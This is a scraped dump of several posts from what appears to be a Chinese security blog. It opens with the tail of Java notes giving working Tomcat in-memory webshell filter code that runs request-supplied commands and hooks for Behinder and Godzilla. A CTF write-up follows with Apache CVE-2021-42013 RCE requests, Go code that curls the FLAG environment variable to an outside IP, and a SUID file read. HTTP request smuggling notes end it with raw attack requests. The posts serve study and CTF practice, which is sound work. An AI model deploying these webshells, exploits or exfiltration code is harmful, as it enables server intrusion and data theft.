Method m = Class.forName(\u0026#34;org.apache.catalina.core.StandardContext\u0026#34;) .getDeclaredMethod(\u0026#34;findFilterMaps\u0026#34;); Object[] filterMaps = (Object[]) m.invoke(standardContext); Object[] tmpFilterMaps = new Object[filterMaps.length]; int index = 1; for (int i = 0; i \u0026lt; filterMaps.length; i++) { Object o = filterMaps[i]; m = ccc.getMethod(\u0026#34;getFilterName\u0026#34;); String name = (String) m.invoke(o); if (name.equalsIgnoreCase(filterName)) { tmpFilterMaps[0] = o; } else { tmpFilterMaps[index++] = filterMaps[i]; } } for (int i = 0; i \u0026lt; filterMaps.length; i++) { filterMaps[i] = tmpFilterMaps[i]; } } } } } catch (Exception e) { // e.printStackTrace(); } } private static ServletContext getServletContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException { ServletRequest servletRequest = null; Class c = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationFilterChain\u0026#34;); java.lang.reflect.Field f = c.getDeclaredField(\u0026#34;lastServicedRequest\u0026#34;); f.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) f.get(null); if (threadLocal != null \u0026amp;\u0026amp; threadLocal.get() != null) { servletRequest = (ServletRequest) threadLocal.get(); // 证明前半部分成功 } // 如果失败则换其他方式 // spring获取法1 if (servletRequest == null) { try { c = Class.forName(\u0026#34;org.springframework.web.context.request.RequestContextHolder\u0026#34;); Method m = c.getMethod(\u0026#34;getRequestAttributes\u0026#34;); Object o = m.invoke(null); c = Class.forName(\u0026#34;org.springframework.web.context.request.ServletRequestAttributes\u0026#34;); m = c.getMethod(\u0026#34;getRequest\u0026#34;); servletRequest = (ServletRequest) m.invoke(o); } catch (Throwable t) {} } if (servletRequest != null) return servletRequest.getServletContext(); // spring获取法2 try { c = Class.forName(\u0026#34;org.springframework.web.context.ContextLoader\u0026#34;); Method m = c.getMethod(\u0026#34;getCurrentWebApplicationContext\u0026#34;); Object o = m.invoke(null); c = Class.forName(\u0026#34;org.springframework.web.context.WebApplicationContext\u0026#34;); m = c.getMethod(\u0026#34;getServletContext\u0026#34;); ServletContext servletContext = (ServletContext) m.invoke(o); return servletContext; } catch (Throwable t) {} return null; } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { // System.out.println(\u0026#34;TomcatShellInject doFilter..........\u0026#34;); String cmd; if ((cmd = servletRequest.getParameter(cmdParamName)) != null) { Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + \u0026#39;\\n\u0026#39;); } servletResponse.getOutputStream().write(stringBuilder.toString().getBytes()); servletResponse.getOutputStream().flush(); servletResponse.getOutputStream().close(); return; } filterChain.doFilter(servletRequest, servletResponse); } @Override public void destroy() { } } 接入冰蝎 只需要在我们重写的doFilter部分多加一个if来适配冰蝎流量的逻辑即可接入冰蝎，代码部分详细分析参见Y4er师傅的Java反序列化注入冰蝎内存马相关踩坑笔记\n// omit else { HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(); // create pageContext HashMap pageContext = new HashMap(); pageContext.put(\u0026#34;request\u0026#34;, request); pageContext.put(\u0026#34;response\u0026#34;, response); pageContext.put(\u0026#34;session\u0026#34;, session); if(request.getMethod().equals(\u0026#34;POST\u0026#34;)){ // 这里的判断条件可自行修改 if(request.getHeader(\u0026#34;Referer\u0026#34;).equalsIgnoreCase(\u0026#34;https://www.baidu.com/\u0026#34;)){ try{ String k = \u0026#34;e45e329feb5d925b\u0026#34;;\t// default: pass=beyond, k=md5(pass)[:16] session.putValue(\u0026#34;u\u0026#34;, k); Cipher c = Cipher.getInstance(\u0026#34;AES\u0026#34;); c.init(2, new SecretKeySpec(k.getBytes(), \u0026#34;AES\u0026#34;)); Method method = Class.forName(\u0026#34;java.lang.ClassLoader\u0026#34;).getDeclaredMethod(\u0026#34;defineClass\u0026#34;, byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); return; }catch (Exception e){ // e.printStackTrace(); } } } } 写一个反序列化接口来测试一下效果\nimport javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.*; @WebServlet(\u0026#34;/cc\u0026#34;) public class CCServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { InputStream inputStream = (InputStream) req; ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); try { objectInputStream.readObject(); } catch (ClassNotFoundException e) { e.printStackTrace(); } resp.getWriter().write(\u0026#34;Success\u0026#34;); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { InputStream inputStream = req.getInputStream(); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); try { objectInputStream.readObject(); } catch (ClassNotFoundException e) { e.printStackTrace(); } resp.getWriter().write(\u0026#34;Success\u0026#34;); } } 先编译TomcatInject.java，再运行CC11Template，生成的ser文件就是最终payload\n# 虽然我把三梦师傅的TomcatEcho和TomcatInject和在一起了 但注意数据包仍然需要发送两次 curl \u0026#34;http://127.0.0.1:8088/cc\u0026#34; --data-binary \u0026#34;@./cc11Test4.ser\u0026#34; 接入哥斯拉 哥斯拉的流量比冰蝎的简单多了，加密内容在参数pass中 以post方式发出，详细分析参见Y4er师傅的解决哥斯拉内存马pagecontext的问题\n继续融入我们原本的filter，代码如下\n// omit else if(request.getHeader(\u0026#34;Referer\u0026#34;).equalsIgnoreCase(\u0026#34;https://www.sohu.com/\u0026#34;)){ try { // default: pass=pass, key=key, xc=md5(key)[:16] String pass = \u0026#34;pass\u0026#34;; String xc = \u0026#34;3c6e0b8a9c15224a\u0026#34;; String md5 = md5(pass + xc); System.out.println(\u0026#34;here\u0026#34;); byte[] data = base64Decode(request.getParameter(pass)); data = x(data, false, xc); if(this.payload == null){\t// 在类中提前声明 `Class payload;` URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader()); Method defMethod = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, byte[].class, Integer.TYPE, Integer.TYPE); defMethod.setAccessible(true); this.payload = (Class)defMethod.invoke(urlClassLoader, data, 0, data.length); }else { ByteArrayOutputStream arrOut = new ByteArrayOutputStream(); Object f = this.payload.newInstance(); f.equals(arrOut); f.equals(data); f.equals(request); response.getWriter().write(md5.substring(0, 16)); f.toString(); response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true, xc))); response.getWriter().write(md5.substring(16)); } return; }catch (Exception e){ e.printStackTrace(); } } 涉及到的几个编码工具方法\npublic static byte[] base64Decode(String bs) throws Exception { byte[] value = null; Class base64; try { base64 = Class.forName(\u0026#34;java.util.Base64\u0026#34;); Object decoder = base64.getMethod(\u0026#34;getDecoder\u0026#34;, (Class[])null).invoke(base64, (Object[])null); value = (byte[])((byte[])decoder.getClass().getMethod(\u0026#34;decode\u0026#34;, String.class).invoke(decoder, bs)); } catch (Exception var6) { try { base64 = Class.forName(\u0026#34;sun.misc.BASE64Decoder\u0026#34;); Object decoder = base64.newInstance(); value = (byte[])((byte[])decoder.getClass().getMethod(\u0026#34;decodeBuffer\u0026#34;, String.class).invoke(decoder, bs)); } catch (Exception e) { e.printStackTrace(); } } return value; } public static String base64Encode(byte[] bs) throws Exception { String value = null; Class base64; try { base64 = Class.forName(\u0026#34;java.util.Base64\u0026#34;); Object Encoder = base64.getMethod(\u0026#34;getEncoder\u0026#34;, (Class[])null).invoke(base64, (Object[])null); value = (String)Encoder.getClass().getMethod(\u0026#34;encodeToString\u0026#34;, byte[].class).invoke(Encoder, bs); } catch (Exception var6) { try { base64 = Class.forName(\u0026#34;sun.misc.BASE64Encoder\u0026#34;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\u0026#34;encode\u0026#34;, byte[].class).invoke(Encoder, bs); } catch (Exception e) { e.printStackTrace(); } } return value; } public static String md5(String s) { String ret = null; try { MessageDigest m = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;); m.update(s.getBytes(), 0, s.length()); ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase(); } catch (Exception e) { e.printStackTrace(); } return ret; } public byte[] x(byte[] s, boolean m, String xc) { try { Cipher c = Cipher.getInstance(\u0026#34;AES\u0026#34;); c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), \u0026#34;AES\u0026#34;)); return c.doFinal(s); } catch (Exception e) { return null; } } 测试效果\n成功达到预期效果\n注意 我们通过反序列化接入的冰蝎和哥斯拉是作为添加的Filter的一部分，所以一旦Filter被kill了，冰蝎和哥斯拉也将会连不上\nx\n以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（ 都0202年了老嗨还在用的 - 各种姿势jsp webshell\nJAVA内存马的“一生”\nTomcat容器攻防笔记之JSP金蝉脱壳\nJava反序列化注入冰蝎内存马相关踩坑笔记\n解决哥斯拉内存马pagecontext的问题\n","date":"2022-05-30T23:20:41+08:00","permalink":"https://amiaaaz.github.io/2022/05/30/java-study-notes-05/","section":"posts","tags":["Java"],"title":"Java学习笔记Ⅴ"},{"categories":[],"contents":"虽说“一三五七八十腊，三十一天永不差”，但还是想提前把5月的流水账小结写掉\n五一快乐穷游，真 · 上山下河，很开心；如果能在村里置个宅院也是很不错的，dream一下\n随后就是两周的教育hvv了，没啥好说的，懂得都懂，不懂的也就不懂了；总之还不错，比之前进步很多，算是把hvv以及渗透测试的起手式给大致摸明白了，需要的技能栈也都最起码知道了名字和思路，但还是离那些带佬们差的非常非常非常非常远，高情商：进步空间太大了\nhvv结束以后把Java安全继续捡起来了，把之前囫囵吞枣略过的地方加固了一下，也提高了一点点结构化思维，希望能再提升一些代码审计的能力，现在看到太长的功能性代码还是下意识会跳过……真的是恶习啊！！！如果不能从业务实现的角度来分析安全漏洞，那注定存在一块危险的短板\nCTF倒是落下了，没有坚持之前刷ctftime的目标，emmm，在努力补起来了\n不过把另一个好习惯接着培养起来了——每天坚持看一些安全相关的推文，存离线的cheatSheet在手机上解决碎片时间（虽然理论上居家不存在碎片时间就是了），看面经巩固所学的知识；希望这个习惯能一直持续下去，日积跬步吧\n*6月希望补齐的短板：代码审计能力，工具编写能力，落下的CTF web\n很难以置信的是竟然已经要6月了，5年前的6月我在肝碧蓝航线，前年的6月我提前回家摆烂高考，去年的6月在buu刷buu，今年的6月……似乎每年的前半年我都会摆过去，可是人生苦短，哪有那么多时间让你摆过去呢？保持冷静和清醒吧，不要再情绪化了\n经常看到很多师傅的博客中都有一句话，大致是：“有技术追求的人应该去挑战那些崇山峻岭”；起初看到不以为意，可是在经过了一些事情之后，又有了“看山还是山”的感悟。既然选择了你所热爱的，那就坚持下去，坚持下去吧\n最后，摘一些霉女士NYU演讲中的句子\nA lot of the time, when we lose things, we gain things too.\nI leave you with this: We are led by our gut instincts, our intuition, our desires and fears, our scars and our dreams. And you will screw it up sometimes. So will I. And when I do, you will most likely read about on the internet. Anyway\u0026hellip; hard things will happen to us. We will recover. We will learn from it. We will grow more resilient because of it.\nScary news is: You\u0026rsquo;re on your own now. Cool news is: You\u0026rsquo;re on your own now.\n","date":"2022-05-29T00:53:39+08:00","permalink":"https://amiaaaz.github.io/life/0522-diary/","section":"life","tags":[],"title":"0522流水账"},{"categories":["LTS","NOTES\u0026SUMMARY"],"contents":"ret=127\nret=127\nret=127\nret=127\nret=127\nret=127\nret=127\n","date":"2022-05-24T17:42:07+08:00","permalink":"https://amiaaaz.github.io/2022/05/24/common-vulns-summary/","section":"posts","tags":[],"title":"关于常见漏洞点的思考"},{"categories":["CTF"],"contents":"Power Cookie GET /check cookie: admin=1 魔法浏览器 控制台给出需要用的UA头\nGET / User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75 getme 页面提示pwd=/usr/local/apache2/\n尝试几个get参数，无\n尝试配置文件/user/local/apache2/conf/httpd.conf，访问不到\n注意到apache版本2.4.50 尝试CVE-2021-42013路径穿越\nGET /icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/flag 是fake flag，那直接rce\nPOST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh echo;ls /diajgk/djflgak/qweqr/eigopl 得到flag的真实路径，再访问\nGET /icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg hackme /upload上传go源文件和编译好的elf文件\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;os\u0026#34; ) func main() { ttt := os.Getenv(\u0026#34;FLAG\u0026#34;) cmd := exec.Command(\u0026#34;curl\u0026#34;, \u0026#34;101.35.114.107:8426\u0026#34;, \u0026#34;-d\u0026#34;, string(ttt)) out, err := cmd.CombinedOutput() if err != nil { fmt.Printf(\u0026#34;combined out:\\n%s\\n\u0026#34;, string(out)) log.Fatalf(\u0026#34;cmd.Run() failed with %s\\n\u0026#34;, err) } fmt.Printf(\u0026#34;combined out:\\n%s\\n\u0026#34;, string(out)) } fxxkgo 原题 go ssti+jwt伪造，[LineCTF 2022]gotm\nezcms 定位到sys/apps/controllers/admin/Update.php，有经典的后台下载zip并解压的功能\n注意到下载中间用到了sys_auth，有个全局key=GKwHuLj9AOhaxJ2\n根据sys_auth生成对应的url，访问，蚁剑\nrootme suid提权\nfind / -perm -4000 2\u0026gt;/dev/null LFILE=/root/flag.txt date -f $LFILE 问卷 好好好\n","date":"2022-05-22T17:25:29+08:00","permalink":"https://amiaaaz.github.io/2022/05/22/dasctf0522-wp/","section":"posts","tags":["wp"],"title":"DasCTF0522 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"参考链接见文末，如有错漏还请指正（滑跪\n*052822：看了很多师傅对于BigIp cve的分析后发现自己对于Hop By Hop漏洞的了解还是浅尝辄止了，不是一个好习惯，警示自己\nHTTP请求走私 漏洞成因 请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致时，这种差异可以让我们在一个HTTP请求中嵌入另一个HTTP请求 以达到走私的目的，直接表现为我们可以访问内网服务，或者造成一些其他的攻击\nkeep-alive \u0026amp; pipeline 为了缓解源站的压力，一般会在用户和后端服务器（源站）之间加设前置服务器，用以缓存、简单校验、负载均衡等，而前置服务器与后端服务器往往是在可靠的网络域中，ip 也是相对固定的，所以可以重用 TCP 连接来减少频繁 TCP 握手带来的开销\n这里就用到了HTTP1.1中的Keep-Alive和Pipeline特性，keep-alive让服务器在接受完这次的http请求后不要关闭TCP连接，对后面相同目标服务器的HTTP请求重用这一个TCP连接，这样只需一次TCP握手，减少服务器开销 节约资源；而Pipeline允许客户端像流水线一样发送请求，服务端根据FIFO原则响应\n以下是使用以及不使用 piepeline 技术的对比图：\n在整个过程中，如果前置服务器和后端服务器应当在HTTP请求的边界划分上不一致，当我们发送精心构造的模糊的HTTP请求，就会产生漏洞，而模糊的点就在于下面要提到的CL \u0026amp; TE\nCL \u0026amp; TE HTTP规范提供了两种不同的方法来指定请求的结束位置 Content-Length和Transfer-Encoding；其中TE请求头比较特殊，HTTP/2中不再支持，指定用于传输请求主体的编码方式，可用的值有chunked/compress/deflate/gzip/identity | doc\n这里我们关注Transfer-Encoding: chunked，当这样设置之后，body按一系列块的形式发送 并省略CL头；每个块的开头用16禁止数表明当前块的长度，数值后接2字节的\\r\\n，然后是块的内容，再接\\r\\n表示结束，最后用长度为0的块表示终止块，终止块后是trailer，由0或多个实体头组成，可以存放对数据的数字签名\nPOST / HTTP/1.1 Host: 1.com Content-Type: application/x-www-form-urlencoded Transfer-Encoding: chunked b q=smuggling 6 hahaha 0 [空白行] [空白行] [chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size = 0][\\r\\n][\\r\\n] 在计算长度时注意这样的原则：\nCL需要将body中\\r\\n所占的2字节计算在内，而块长度要忽略块内容末尾表示终止的\\r\\n 请求头和body中空行不计入CL 测试用chunked发送\nWikipedia in\\r\\n\\r\\nchunks. 可以这样\nPOST /xxx HTTP/1.1 Host: xxx Content-Type: text/plain Transfer-Encoding: chunked 4\\r\\n Wiki\\r\\n 5\\r\\n pedia\\r\\n e\\r\\n in\\r\\n\\r\\nchunks.\\r\\n 0\\r\\n \\r\\n 4是16进制数 后接2字节\\r\\n表示chunk-size，后接chunk-size大小的Wiki，后接两字节的\\r\\n表示chunk-data部分\n第三部分数据\ne\\r\\n in\\r\\n\\r\\nchunks.\\r\\n e = 14 = 1(空格) + 2(in) + 4(\\r\\n*2) + 7(chunks.)\n最后的0\\r\\n\\r\\n表示 chunk 部分结束\n攻击方式 CL.TE 前端服务器处理Content-Length，后端服务器遵守RFC2616规定处理Transfer-Encoding\nPOST / HTTP/1.1 Host: 1.com Content-Length: 6 Transfer-Encoding: chunked 0 a a会被认作下一个请求的一部分，留在缓冲区等待剩余的请求，此时再有GET就会被拼接为aGET / HTTP/1.1\\r\\n，畸形的aGET会造成解析异常\naGET / HTTP/1.1 Host: 1.com .... 如果存在这样的漏洞，发送上面的payload会造成延时（后端服务器等下一个chunk来清掉缓冲区\nTE.CL 前端服务器Transfer-Encoding，后端服务器Content-Length标头\nPOST / HTTP/1.1 Host: example.com ... Content-Length: 4 Transfer-Encoding: chunked 17 POST /rook1e HTTP/1.1 0 [空白行] [空白行] 前端服务器分块传输长度为17的块POST /rook1e HTTP/1.1\\r\\n，后端则根据CL=4截取到17\\r\\n并把后面的放入缓冲区，此时再有GET就会被拼接为POST /rook1e走私请求\nPOST /rook1e HTTP/1.1 0 GET / HTTP/1.1 .... 如果存在这样的漏洞，发送上面的payload会造成延时（后端服务器等待剩余部分\nTE.TE 前端和后端服务器都支持Transfer-Encoding 标头，但是容错性上表现不同，可以通过以某种方式来诱导其中一个服务器不处理它，变为上面两种之一\nPOST / HTTP/1.1 Host: 1.com Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding[空格]: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 [空白行] [空白行] fuzz用payload，根据实现RFC的不同而有细微的差别\nTransfer-Encoding: xchunked Transfer-Encoding[空格]: chunked Transfer-Encoding: chunked Transfer-Encoding: x Transfer-Encoding:[tab]chunked [空格]Transfer-Encoding: chunked X: X[\\n]Transfer-Encoding: chunked Transfer-Encoding : chunked CL.CL 请求包中包含两个不同值得Content-Length，根据RFC7230会返回400，但是有可能服务器并没有严格遵守这个规范\nPOST / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 8\\r\\n Content-Length: 7\\r\\n 12345\\r\\n a a会被带入下一个请求，变为aGET / HTTP/1.1\\r\\n\nCL in GET 前端服务器允许GET携带body，后端不允许GET携带body 并直接忽略GET请求中的Content-Length标头，基于pipeline机制认为这是两个独立的请求（类似Nodejs中的cve-2018-12116）\nGET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 41\\r\\n \\r\\n GET /secret HTTP/1.1\\r\\n Host: example.com\\r\\n \\r\\n 后端认作两个独立的请求，这里格外注意CL值得计算22+19=41（分别len一下\nGET /secret HTTP/1.1\\r\\n\t--\u0026gt;\t20个字符+CRLF = 22 Host: example.com\\r\\n\t--\u0026gt;\t17个字符+CRLF = 19 optional whitespace/cve-2019-16869 RFC7320中要求header部分 字段之后要紧跟:，之后是optional whitespace；如果有中间件没有严格实现这个RFC就会有被攻击的可能\ncve-2019-16869是Netty中间件的漏洞，在4.1.42Final版本前对于Header头的处理是使用splitHeader方法，其中关键代码如下：\nfor (nameEnd = nameStart; nameEnd \u0026lt; length; nameEnd ++) { char ch = sb.charAt(nameEnd); if (ch == \u0026#39;:\u0026#39; || Character.isWhitespace(ch)) { break; } } 这里将空格与冒号同样处理了，也就是说如果存在空格会把冒号之前的field name正常处理而不会抛出错误或进行其他操作\nPOST /getusers HTTP/1.1 Host: www.backend.com Content-Length: 64 Transfer-Encoding : chunked 0 GET /hacker HTTP/1.1 Host: www.hacker.com hacker: hacker 用ELB作前端服务器，Netty作后端服务器，当发送上述请求时由于TE字段冒号前的空格不符合RFC标准，会被ELB忽略 按照CL解析并转发给后端的Netty，Netty会优先解析TE（即使不合RFC的标准）并拆分为一以下两个请求\nPOST /getusers HTTP/1.1 Host: www.backend.com Content-Length: 64 Transfer-Encoding : chunked 0 GET /hacker HTTP/1.1 Host: www.hacker.com hacker: hacker 在4.1.42Final中修复了这个洞，当不规范的请求头出现时会返回400\nchunk size issue printf \u0026#39;GET / HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0000000000000000000000000000042\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;GET /tmp/ HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ | nc -q3 127.0.0.1 8080 某些中间件在解析块大小的时候，会将长度块大小长度进行截断，比如这里表现为只取'0000000000000000000000000000042为00000000000000000，这样就会认为这是两个请求了，第一个请求的块大小为0，第二个就会请求/tmp，就导致了 HTTP Smuggling\nHTTP/0.9 HTTP/1.1\nGET /foo HTTP/1.1\\r\\n Host: example.com\\r\\n HTTP/1.0\nGET /foo HTTP/1.0\\r\\n \\r\\n HTTP/0.9\nGET /foo\\r\\n HTTP/0.9请求包与响应包是都没有 headers 的概念的，body是文本流形式，所以理所当然的尝试攻击\n图中走私的部分并不是HTTP/0.9的标准格式但由于一些中间件虽然已经不支持直接解析HTTP/0.9的标准格式，但是还可能存在解析这种指定 HTTP version 的情况\n视频演示-link\n实际用例 绕过前端安全控制 https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te\n我们需要获取admin权限并删除carlos用户；直接访问/admin提示403，尝试smuggling\nPOST / HTTP/1.1 Host: acf91f491f39aa83ca24ee71001b00aa.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 28 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 发送2次后回显Admin interface only available if logged in as an administrator, or if requested as localhost，我们在走私的部分加上localhost并更新CL长度\nPOST / HTTP/1.1 Host: acf91f491f39aa83ca24ee71001b00aa.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 45 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost 得到删除carlos的api /admin/delete?username=carlos，继续修改payload\nPOST / HTTP/1.1 Host: acf91f491f39aa83ca24ee71001b00aa.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 68 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost 一定注意\\r\\n数量和CL的大小\n泄露代理服务器重写字段 https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting\n我们需要首先找出被前端服务器增加的字段，之后伪造本地请求并smuggling访问/admin并删除carlos账号\n要达到前者的目的，portswigger的解决方案是这样的\n找一个能够将请求参数的值输出到响应中的POST请求 把该POST请求中，找到的这个特殊的参数放在消息的最后面 走私这个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来 尝试前面的payload\nPOST / HTTP/1.1 Host: aca21f881e7fa688c0e81584004700af.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 28 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 回显Admin interface only available if logged in as an administrator, or if requested from 127.0.0.1，我们利用搜索回显将前端服务器转发的请求头泄露出来，这里第二部分的CL=70用来控制泄露字节的多少\nPOST / HTTP/1.1 Host: aca21f881e7fa688c0e81584004700af.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=VfYd3AGPB3TOUZNTRF2frj0c5kNJgBpw Content-Length: 103 Transfer-Encoding: chunked 0 POST / HTTP/1.1 Content-Length: 70 Content-Type: application/x-www-form-urlencoded search=123 发现前端服务器自动会加上X-XpZgRc-Ip的请求头，如果我们直接加一样的内容会因为duplicate header names的原因而403，我们选择smuggling攻击将前端服务器多加的请求头隐藏掉\nPOST / HTTP/1.1 Host: aca21f881e7fa688c0e81584004700af.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=VfYd3AGPB3TOUZNTRF2frj0c5kNJgBpw Content-Length: 75 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 X-XpZgRc-Ip: 127.0.0.1 Content-Length: 10 x=1 回显删除carlos的api /admin/delete?username=carlos\n获取其它用户请求 原理跟上面泄露字段大体相同，既然能得到中间件请求 我们也可以尝试得到其它用户的请求和cookie等\nPOST / HTTP/1.1 Host: ac951f7d1e9ea625803c617f003f005c.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Content-Length: 271 Transfer-Encoding: chunked 0 POST /post/comment HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 600 Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN\u0026amp;postId=5\u0026amp;name=1\u0026amp;email=1%40qq.com\u0026amp;website=http%3A%2F%2Fwww.baidu.com\u0026amp;comment=1 加强版XSS UA头有反射XSS，我们构造这样的payload\nPOST / HTTP/1.1 Host: ac811f011e27d43b80301693005a0007.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ Upgrade-Insecure-Requests: 1 Content-Length: 150 Transfer-Encoding: chunked 